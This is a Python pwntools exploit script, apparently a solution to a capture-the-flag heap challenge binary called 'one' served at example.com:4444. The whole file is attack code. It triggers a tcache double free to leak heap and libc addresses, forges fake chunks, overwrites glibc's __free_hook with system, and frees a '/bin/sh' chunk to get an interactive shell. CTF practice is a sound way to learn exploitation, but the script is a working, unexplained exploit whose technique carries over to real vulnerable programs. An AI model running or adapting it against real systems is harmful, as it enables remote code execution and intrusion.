#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep

def add(p, buf):
    p.recvuntil(">")
    p.sendline("1")
    p.recvuntil(">")
    p.sendline(buf)

def show(p):
    p.recvuntil(">")
    p.sendline("2")
    return p.recvline().lstrip(b"\x20").rstrip(b"\n")

def delete(p):
    p.recvuntil(">")
    p.sendline("3")


if __name__ == '__main__':
    context.terminal = ['tmux', 'sp', '-h']
    context.log_level = "debug"

    chall = "./one"
    libc = ELF("./libc.so.6")
    elf = ELF(chall)
    context.binary = chall
    context.binary.checksec()

    if len(argv) >= 2 and argv[1] == "r":
        p = remote("example.com", 4444)
    elif len(argv) >= 2 and argv[1] == "d":
    	cmd = """
    		c
            loadsym
    	"""
    	p = gdb.debug(chall,cmd)
    else:
        p = process(chall)

    # leak chunk address
    add(p, 'DUMMY')
    for _ in range(3):
        delete(p)
    leak = u64(show(p) + b"\00\00")
    log.info("leak: " + hex(leak))
    add(p, p64(0))
    add(p, "DUMMY")
    # make fake chunks
    fake_chunk_header = leak + 0x50 + 0x10
    for _ in range(4):
        add(p, (p64(0) + p64(0x91)) * 3)
    delete(p)
    delete(p)
    add(p, p64(fake_chunk_header))
    add(p, "DUMMY")
    add(p, "DUMMY")
    for _ in range(8):
        delete(p)
    main_arena_addr = u64(show(p) + b"\00\00")
    log.info("main_arena+96: " + hex(main_arena_addr))
    libc_base = main_arena_addr - 0x3ebc40 - 96
    log.info("libc_base: " + hex(libc_base))
    # get a shell !
    add(p, "DUMMY")
    delete(p)
    delete(p)
    add(p, p64(libc.symbols['__free_hook'] + libc_base))
    add(p, "DUMMY")
    add(p, p64(libc.symbols['system'] + libc_base))
    add(p, "/bin/sh")
    delete(p)

    p.interactive()
